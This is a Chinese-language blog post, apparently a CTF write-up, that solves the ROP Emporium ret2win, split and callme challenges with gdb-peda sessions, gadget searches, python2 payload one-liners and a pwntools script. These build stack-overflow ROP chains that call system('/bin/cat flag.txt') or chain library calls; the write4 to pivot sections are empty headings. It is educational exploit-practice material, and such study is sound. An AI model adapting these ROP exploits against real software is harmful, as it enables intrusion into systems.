---
layout: post
title: ROP Emporium Writeup
category: CTF
tags: ctf
keywords: ctf, binary, hack
description:
---

[ROP Emporium](https://ropemporium.com/)

## ret2win
一个简单的栈溢出覆盖返回地址，先看 32 位程序：
```
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x080485f6 <+0>:     push   ebp
   0x080485f7 <+1>:     mov    ebp,esp
   0x080485f9 <+3>:     sub    esp,0x28
   0x080485fc <+6>:     sub    esp,0x4
   0x080485ff <+9>:     push   0x20
   0x08048601 <+11>:    push   0x0
   0x08048603 <+13>:    lea    eax,[ebp-0x28]
   0x08048606 <+16>:    push   eax
   0x08048607 <+17>:    call   0x8048460 <memset@plt>
   0x0804860c <+22>:    add    esp,0x10
   0x0804860f <+25>:    sub    esp,0xc
   0x08048612 <+28>:    push   0x804873c
   0x08048617 <+33>:    call   0x8048420 <puts@plt>
   0x0804861c <+38>:    add    esp,0x10
   0x0804861f <+41>:    sub    esp,0xc
   0x08048622 <+44>:    push   0x80487bc
   0x08048627 <+49>:    call   0x8048420 <puts@plt>
   0x0804862c <+54>:    add    esp,0x10
   0x0804862f <+57>:    sub    esp,0xc
   0x08048632 <+60>:    push   0x8048821
   0x08048637 <+65>:    call   0x8048400 <printf@plt>
   0x0804863c <+70>:    add    esp,0x10
   0x0804863f <+73>:    mov    eax,ds:0x804a060
   0x08048644 <+78>:    sub    esp,0x4
   0x08048647 <+81>:    push   eax
   0x08048648 <+82>:    push   0x32
   0x0804864a <+84>:    lea    eax,[ebp-0x28]
   0x0804864d <+87>:    push   eax
   0x0804864e <+88>:    call   0x8048410 <fgets@plt>
   0x08048653 <+93>:    add    esp,0x10
   0x08048656 <+96>:    nop
   0x08048657 <+97>:    leave  
   0x08048658 <+98>:    ret    
End of assembler dump.
gdb-peda$ disassemble ret2win 
Dump of assembler code for function ret2win:
   0x08048659 <+0>:     push   ebp
   0x0804865a <+1>:     mov    ebp,esp
   0x0804865c <+3>:     sub    esp,0x8
   0x0804865f <+6>:     sub    esp,0xc
   0x08048662 <+9>:     push   0x8048824
   0x08048667 <+14>:    call   0x8048400 <printf@plt>
   0x0804866c <+19>:    add    esp,0x10
   0x0804866f <+22>:    sub    esp,0xc
   0x08048672 <+25>:    push   0x8048841
   0x08048677 <+30>:    call   0x8048430 <system@plt>
   0x0804867c <+35>:    add    esp,0x10
   0x0804867f <+38>:    nop
   0x08048680 <+39>:    leave  
   0x08048681 <+40>:    ret    
End of assembler dump.
```
函数 `ret2win()` 的地址为 `0x08048659`，
```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium_all_challenges/ret2win32/ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd580 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EBX: 0x0 
ECX: 0xffffd580 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EDX: 0xf7f90860 --> 0x0 
ESI: 0xf7f8ee28 --> 0x1d1d30 
EDI: 0x0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd5b0 --> 0xf7f80062 --> 0x41000000 ('')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd5b0 --> 0xf7f80062 --> 0x41000000 ('')
0004| 0xffffd5b4 --> 0xffffd5d0 --> 0x1 
0008| 0xffffd5b8 --> 0x0 
0012| 0xffffd5bc --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
0016| 0xffffd5c0 --> 0xf7f8ee28 --> 0x1d1d30 
0020| 0xffffd5c4 --> 0xf7f8ee28 --> 0x1d1d30 
0024| 0xffffd5c8 --> 0x0 
0028| 0xffffd5cc --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern_offset 0x41414641
1094796865 found at offset: 44
```
得到了偏移为 44，于是构造下面的输入：
```
$ python2 -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32 
...
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

64 位程序也是一样的，只不过返回地址变成了 8 个字节：
```
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium_all_challenges/ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe3b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0x1f 
RDX: 0x7ffff7dd4710 --> 0x0 
RSI: 0x7fffffffe3b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RDI: 0x7fffffffe3b1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe3d8 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:      ret)
R8 : 0x0 
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
R11: 0x246 
R12: 0x400650 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe4c0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>: call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>: nop
   0x40080f <pwnme+90>: leave  
=> 0x400810 <pwnme+91>: ret    
   0x400811 <ret2win>:  push   rbp
   0x400812 <ret2win+1>:        mov    rbp,rsp
   0x400815 <ret2win+4>:        mov    edi,0x4009e0
   0x40081a <ret2win+9>:        mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3d8 ("AA0AAFAAb")
0008| 0x7fffffffe3e0 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffe3e8 --> 0x7ffff7a41f6a (<__libc_start_main+234>:       mov    edi,eax)
0024| 0x7fffffffe3f0 --> 0x0 
0032| 0x7fffffffe3f8 --> 0x7fffffffe4c8 --> 0x7fffffffe82a ("/home/firmy/Desktop/rop_emporium_all_challenges/ret2win/ret2win")
0040| 0x7fffffffe400 --> 0x100000000 
0048| 0x7fffffffe408 --> 0x400746 (<main>:      push   rbp)
0056| 0x7fffffffe410 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern_offset 0x6141414541412941
7007954260868540737 found at offset: 32
```
函数 `ret2win()` 的地址为 `0x0000000000400810`。寄存器 `rbp` 的内容为 `0x6141414541412941`，查看其偏移为 32，则返回地址在 32+8 的位置，构造输入：
```
$ python2 -c "print 'A'*40 + '\x11\x08\x40\x00\x00\x00\x00\x00'" | ./ret2win 
...
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

## split
```
$ rabin2 -z split32 
vaddr=0x080486f0 paddr=0x000006f0 ordinal=000 sz=22 len=21 section=.rodata type=ascii string=split by ROP Emporium
vaddr=0x08048706 paddr=0x00000706 ordinal=001 sz=8 len=7 section=.rodata type=ascii string=32bits\n
vaddr=0x0804870e paddr=0x0000070e ordinal=002 sz=9 len=8 section=.rodata type=ascii string=\nExiting
vaddr=0x08048718 paddr=0x00000718 ordinal=003 sz=44 len=43 section=.rodata type=ascii string=Contriving a reason to ask user for data...
vaddr=0x08048747 paddr=0x00000747 ordinal=004 sz=8 len=7 section=.rodata type=ascii string=/bin/ls
vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
```
rabin2 是 radare2 里的一个工具，一般拿到一个可执行文件，先查一下它包含字符串，从中发现了 `/bin/cat flag.txt`，地址在 `0x0804a030`。下面开始调试：
```
gdb-peda$ xrefs 
All call references
0x80483c4 <_init+4>:    call   0x80484b0 <__x86.get_pc_thunk.bx>
0x80483d9 <_init+25>:   call   0x8048470
0x804849c <_start+28>:  call   0x8048440 <__libc_start_main@plt>
0x80484e3 <deregister_tm_clones+35>:    call   eax
0x804851d <register_tm_clones+45>:      call   edx
0x804853f <__do_global_dtors_aux+15>:   call   0x80484c0 <deregister_tm_clones>
0x8048570 <frame_dummy+32>:     call   edx
0x8048598 <main+29>:    call   0x8048450 <setvbuf@plt>
0x80485ac <main+49>:    call   0x8048450 <setvbuf@plt>
0x80485bc <main+65>:    call   0x8048420 <puts@plt>
0x80485cc <main+81>:    call   0x8048420 <puts@plt>
0x80485d4 <main+89>:    call   0x80485f6 <pwnme>
0x80485e1 <main+102>:   call   0x8048420 <puts@plt>
0x8048607 <pwnme+17>:   call   0x8048460 <memset@plt>
0x8048617 <pwnme+33>:   call   0x8048420 <puts@plt>
0x8048627 <pwnme+49>:   call   0x8048400 <printf@plt>
0x804863e <pwnme+72>:   call   0x8048410 <fgets@plt>
0x8048657 <usefulFunction+14>:  call   0x8048430 <system@plt>
0x8048674 <__libc_csu_init+4>:  call   0x80484b0 <__x86.get_pc_thunk.bx>
0x804868c <__libc_csu_init+28>: call   0x80483c0 <_init>
0x80486b4 <__libc_csu_init+68>: call   DWORD PTR [ebx+edi*4-0xf8]
0x80486d8 <_fini+4>:    call   0x80484b0 <__x86.get_pc_thunk.bx>
gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x08048649 <+0>:     push   ebp
   0x0804864a <+1>:     mov    ebp,esp
   0x0804864c <+3>:     sub    esp,0x8
   0x0804864f <+6>:     sub    esp,0xc
   0x08048652 <+9>:     push   0x8048747
   0x08048657 <+14>:    call   0x8048430 <system@plt>
   0x0804865c <+19>:    add    esp,0x10
   0x0804865f <+22>:    nop
   0x08048660 <+23>:    leave  
   0x08048661 <+24>:    ret    
End of assembler dump.
```
`xrefs` 看到一个函数 `usefulFunction`，该函数调用 `system()`，所以我们控制返回地址跳转到 `0x08048657`，然后将`/bin/cat flag.txt` 的地址传给它，从而打印出 flag。控制返回地址的方法和上一题一样，得到偏移为 44。
下面构造输入：
```
$ python2 -c "print 'A'*44 + '\x57\x86\x04\x08' + '\x30\xa0\x04\x08'" | ./split32 
...
> ROPE{a_placeholder_32byte_flag!}
```
这题还可以利用 plt 的原理来做，`system@plt` 的地址为 `0x8048430`，由于有一个参数，需要一个 `pop ret` 的 gadget：
```
$ objdump -d split32 | grep -A 1 pop
 80483e1:       5b                      pop    %ebx
 80483e2:       c3                      ret
```
gadget 地址 `0x80483e1`，构造下面的输入：
```
$ python2 -c "print 'A'*44 + '\x30\x84\x04\x08' + '\xe1\x83\x04\x08' + '\x30\xa0\x04\x08'" | ./split32 
...
> ROPE{a_placeholder_32byte_flag!}
```
其实由于没有后续的步骤，这里 gadget 的地方填什么都可以，比如 `AAAA`。

下面是 64 位程序：
```
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium_all_challenges/split/split 
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe3c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RBX: 0x0 
RCX: 0x1f 
RDX: 0x7ffff7dd4710 --> 0x0 
RSI: 0x7fffffffe3c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RDI: 0x7fffffffe3c1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe3e8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
RIP: 0x400806 (<pwnme+81>:      ret)
R8 : 0x0 
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
R11: 0x246 
R12: 0x400650 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe4d0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ff <pwnme+74>: call   0x400620 <fgets@plt>
   0x400804 <pwnme+79>: nop
   0x400805 <pwnme+80>: leave  
=> 0x400806 <pwnme+81>: ret    
   0x400807 <usefulFunction>:   push   rbp
   0x400808 <usefulFunction+1>: mov    rbp,rsp
   0x40080b <usefulFunction+4>: mov    edi,0x4008ff
   0x400810 <usefulFunction+9>: call   0x4005e0 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3e8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0008| 0x7fffffffe3f0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0016| 0x7fffffffe3f8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0024| 0x7fffffffe400 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA")
0032| 0x7fffffffe408 ("IAAeAA4AAJAAfAA5AAKAAgA")
0040| 0x7fffffffe410 ("AJAAfAA5AAKAAgA")
0048| 0x7fffffffe418 --> 0x416741414b4141 ('AAKAAgA')
0056| 0x7fffffffe420 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400806 in pwnme ()
gdb-peda$ find '/bin/cat'
Searching for '/bin/cat' in: None ranges
Found 1 results, display max 1 items:
split : 0x601060 ("/bin/cat flag.txt")
gdb-peda$ pattern_offset 0x6141414541412941
7007954260868540737 found at offset: 32
```
在 64 位下，前六个参数通过 RDI、RSI、RDX、RCX、R8 和 R9 传递，system() 传入一个参数，所以需要使用 `pop rdi; ret` 的 gadget 将字符串的地址传入 rdi 寄存器中。
```
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x00400883 : (b'5fc3')  pop rdi; ret
```
地址在 `0x00400883`，下面构造输入：
```
$ python2 -c "print 'A'*40 + '\x83\x08\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x10\x08\x40\x00\x00\x00\x00\x00'" | ./split 
...
> ROPE{a_placeholder_32byte_flag!}
```

## callme
题目要求依次调用 `callme_one`、`callme_two`和`callme_three`，并且分别传入三个参数 `1`、`2`、`3`，主要考查参数传递和函数调用。

首先得到三个函数的 plt 地址：
```
$ rabin2 -i callme32 | grep callme
ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three
ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
```
由于函数有三个参数，我们需要一个类似 `pop pop pop ret` 的 gadget，使用 objdump 来找到它：
```
$ objdump -d callme32 | grep -A 3 pop
...
 80488a8:       5b                      pop    %ebx
 80488a9:       5e                      pop    %esi
 80488aa:       5f                      pop    %edi
 80488ab:       5d                      pop    %ebp
 80488ac:       c3                      ret    
 80488ad:       8d 76 00                lea    0x0(%esi),%esi
...
```
地址在 `0x80488a9`，当然也可以找 `add esp, 8; pop ebp; ret` 这样的：
```
gdb-peda$ ropsearch "add esp, 8"
Searching for ROP gadget: 'add esp, 8' in: binary ranges
0x08048576 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
0x080488c3 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
```
最后构造输入如下：
```
$ python2 -c "print 'A'*44 + '\xc0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\x20\x86\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\xb0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00'" | ./callme32 
...
> ROPE{a_placeholder_32byte_flag!}
```

下面是 64 位程序：
```
$ rabin2 -i callme | grep callme
ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three
ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one
ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two
```
```
gdb-peda$ ropsearch "pop rdi; pop rsi"
Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret
```
构造输入，有点长，我还是用 pwntools 吧：
```
from pwn import *

io = process("./callme")

callme_one_plt = 0x00401850
callme_two_plt = 0x00401870
callme_three_plt = 0x00401810
pppr_addr = 0x00401ab0

payload = "A"*40 + p64(pppr_addr) + p64(0x1) + p64(0x2) + p64(0x3) + p64(callme_one_plt) + p64(pppr_addr) + p64(0x1) + p64(0x2) + p64(0x3) + p64(callme_two_plt) + p64(pppr_addr) + p64(0x1) + p64(0x2) + p64(0x3) + p64(callme_three_plt)

io.sendline(payload)
print io.recvall()
```

## write4

## badchars

## fluff

## pivot
